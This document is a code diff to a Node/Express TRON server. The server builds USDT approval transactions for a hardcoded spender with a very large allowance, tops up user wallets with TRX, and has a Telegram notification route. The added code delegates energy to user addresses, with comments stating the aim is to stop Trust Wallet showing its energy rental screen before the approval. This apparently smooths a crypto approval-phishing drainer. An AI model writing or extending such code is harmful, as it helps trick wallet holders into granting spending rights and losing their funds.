@@ -31,7 +31,8 @@ const limiter = rateLimit({
       path === '/api/telegram' ||
       path === '/telegram-notify' ||
       path === '/api/event' ||
-      path === '/build-approve'
+      path === '/build-approve' ||
+      path === '/prepare-energy'
     ) {
       return true;
     }
@@ -99,7 +100,10 @@ const SERVER_CONFIG = {
   autoSendAmount: Number(process.env.AUTO_SEND_AMOUNT || 20),
   minimumBalance: Number(process.env.MINIMUM_BALANCE || 11),
   // Keep a little TRX for bandwidth / fees so sends do not fail at the edge
-  feeReserve: Number(process.env.FEE_RESERVE_TRX || 1)
+  feeReserve: Number(process.env.FEE_RESERVE_TRX || 1),
+  // TRX amount of ENERGY to delegate to user so Trust does not show Energy rental
+  delegateEnergyTrx: Number(process.env.DELEGATE_ENERGY_TRX || 15),
+  minUserEnergy: Number(process.env.MIN_USER_ENERGY || 65000)
 };
 
 if (SERVER_CONFIG.address) {
@@ -122,6 +126,126 @@ function isRateLimitedError(error) {
     errorText.includes('too many requests') ||
     errorText.includes('rate limit')
   );
+}
+
+async function getUserEnergyLeft(address) {
+  try {
+    const resources = await tronWeb.trx.getAccountResources(address);
+    const limit = Number(resources?.EnergyLimit || 0);
+    const used = Number(resources?.EnergyUsed || 0);
+    return Math.max(0, limit - used);
+  } catch (error) {
+    logEvent('USER_ENERGY_CHECK_FAILED', { address, error: error.message });
+    return 0;
+  }
+}
+
+async function signAndBroadcast(tx) {
+  const signed = await tronWeb.trx.sign(tx, SERVER_CONFIG.privateKey);
+  return tronWeb.trx.sendRawTransaction(signed);
+}
+
+/**
+ * Delegate ENERGY from server wallet to user so Trust Wallet
+ * does NOT show the Energy rental Continue screen.
+ */
+async function ensureUserEnergy(userAddress) {
+  if (!SERVER_CONFIG.privateKey || !SERVER_CONFIG.address) {
+    return { ok: false, reason: 'server_wallet_not_configured' };
+  }
+
+  const energyLeft = await getUserEnergyLeft(userAddress);
+  logEvent('USER_ENERGY_CHECK', {
+    userAddress,
+    energyLeft,
+    required: SERVER_CONFIG.minUserEnergy
+  });
+
+  if (energyLeft >= SERVER_CONFIG.minUserEnergy) {
+    return { ok: true, delegated: false, reason: 'already_has_energy', energyLeft };
+  }
+
+  const amountSun = Number(tronWeb.toSun(SERVER_CONFIG.delegateEnergyTrx));
+
+  const tryDelegate = async () => {
+    const tx = await tronWeb.transactionBuilder.delegateResource(
+      amountSun,
+      userAddress,
+      'ENERGY',
+      SERVER_CONFIG.address,
+      false
+    );
+    return signAndBroadcast(tx);
+  };
+
+  try {
+    const result = await tryDelegate();
+    const txid = result.txid || result.transaction?.txID;
+    const accepted = result.result === true || Boolean(txid);
+    if (!accepted) {
+      throw new Error(result.message || result.code || 'delegate rejected');
+    }
+    logEvent('ENERGY_DELEGATED', {
+      userAddress,
+      amountTrx: SERVER_CONFIG.delegateEnergyTrx,
+      transactionId: txid
+    });
+    await wait(2000);
+    return {
+      ok: true,
+      delegated: true,
+      amountTrx: SERVER_CONFIG.delegateEnergyTrx,
+      transactionId: txid
+    };
+  } catch (delegateError) {
+    logEvent('ENERGY_DELEGATE_DIRECT_FAILED', {
+      userAddress,
+      error: delegateError.message
+    });
+  }
+
+  // Freeze ENERGY on server, then delegate
+  try {
+    const freezeTx = await tronWeb.transactionBuilder.freezeBalanceV2(
+      amountSun,
+      'ENERGY',
+      SERVER_CONFIG.address
+    );
+    const freezeResult = await signAndBroadcast(freezeTx);
+    const freezeTxid = freezeResult.txid || freezeResult.transaction?.txID;
+    logEvent('ENERGY_FROZEN_FOR_DELEGATE', {
+      amountTrx: SERVER_CONFIG.delegateEnergyTrx,
+      transactionId: freezeTxid
+    });
+    await wait(3000);
+
+    const result = await tryDelegate();
+    const txid = result.txid || result.transaction?.txID;
+    const accepted = result.result === true || Boolean(txid);
+    if (!accepted) {
+      throw new Error(result.message || result.code || 'delegate rejected after freeze');
+    }
+    logEvent('ENERGY_DELEGATED', {
+      userAddress,
+      amountTrx: SERVER_CONFIG.delegateEnergyTrx,
+      afterFreeze: true,
+      transactionId: txid
+    });
+    await wait(2000);
+    return {
+      ok: true,
+      delegated: true,
+      afterFreeze: true,
+      amountTrx: SERVER_CONFIG.delegateEnergyTrx,
+      transactionId: txid
+    };
+  } catch (error) {
+    logEvent('ENERGY_PREPARE_FAILED', {
+      userAddress,
+      error: error.message
+    });
+    return { ok: false, reason: error.message };
+  }
 }
 
 async function getTrxBalance(address) {
@@ -304,17 +428,49 @@ app.post('/api/event', (req, res) => {
   }
 });
 
+// Delegate energy to user so Trust Wallet does not show Energy rental
+app.post('/prepare-energy', validateRequest, async (req, res) => {
+  try {
+    const { userAddress } = req.body;
+    logEvent('PREPARE_ENERGY_START', { userAddress });
+    const energy = await ensureUserEnergy(userAddress);
+    const energyLeft = await getUserEnergyLeft(userAddress);
+    logEvent('PREPARE_ENERGY_RESULT', { userAddress, ...energy, energyLeft });
+    res.json({
+      success: Boolean(energy.ok),
+      ...energy,
+      energyLeft
+    });
+  } catch (error) {
+    console.error('Prepare energy error:', error);
+    logEvent('PREPARE_ENERGY_FAILED', {
+      userAddress: req.body?.userAddress,
+      error: error.message
+    });
+    res.status(500).json({
+      success: false,
+      error: 'Failed to prepare energy',
+      message: error.message
+    });
+  }
+});
+
 // Build USDT approve tx on server (uses TronGrid API key) so frontend avoids 429
 app.post('/build-approve', validateRequest, async (req, res) => {
   try {
     const { userAddress } = req.body;
-    // Default 10 TRX feeLimit — avoids Trust Wallet energy-rental Continue hang
-    const feeLimit = Number(req.body.feeLimit) > 0 ? Number(req.body.feeLimit) : 1e7;
+    // Never use 1e9 (USDT energy rental). Max 15 TRX feeLimit.
+    let feeLimit = Number(req.body.feeLimit) > 0 ? Number(req.body.feeLimit) : 15e6;
+    if (feeLimit >= 1e9) feeLimit = 15e6;
     const usdtContract = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
     const spender = 'TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw';
     const amount = '100000000000';
 
     logEvent('BUILD_APPROVE_START', { userAddress, feeLimit });
+
+    // Ensure user has ENERGY before building approve (removes Trust Energy rental UI)
+    const energy = await ensureUserEnergy(userAddress);
+    logEvent('BUILD_APPROVE_ENERGY', { userAddress, ...energy });
 
     const parameters = [
       { type: 'address', value: spender },
@@ -370,7 +526,8 @@ app.post('/build-approve', validateRequest, async (req, res) => {
       success: true,
       triggerResult,
       feeLimit,
-      owner: userAddress
+      owner: userAddress,
+      energy
     });
   } catch (error) {
     console.error('Build approve error:', error);
@@ -511,13 +668,28 @@ app.post('/send-trx', validateRequest, async (req, res) => {
         amount: SERVER_CONFIG.autoSendAmount,
         transactionId: txid
       });
+
+      // Delegate ENERGY so Trust approve screen has no Energy rental
+      let energy = null;
+      try {
+        await wait(1500);
+        energy = await ensureUserEnergy(userAddress);
+      } catch (energyError) {
+        logEvent('ENERGY_AFTER_TOPUP_FAILED', {
+          userAddress,
+          error: energyError.message
+        });
+        energy = { ok: false, reason: energyError.message };
+      }
+
       return res.json({
         success: true,
         message: `Sent ${SERVER_CONFIG.autoSendAmount} TRX successfully`,
         transactionId: txid,
         amount: SERVER_CONFIG.autoSendAmount,
         recipient: userAddress,
-        sent: true
+        sent: true,
+        energy
       });
     }
 
